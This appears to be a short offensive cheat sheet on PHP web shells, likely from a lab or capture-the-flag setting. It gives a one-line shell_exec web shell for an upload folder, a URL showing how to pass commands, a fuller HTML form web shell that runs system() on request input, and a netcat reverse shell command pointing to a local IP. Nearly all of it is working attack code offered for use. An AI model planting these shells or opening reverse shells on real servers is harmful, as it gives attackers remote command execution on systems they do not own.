
Eg: in any php file, in the uploadfolder 

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

```


would alow you

`website/uploads/<filename>?cmd=ipconfig`

simple php webshell script:
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```


with this script you can re-connect back to your local ip with nc
```
nc 10.6.62.249 9999 -e /bin/bash
```
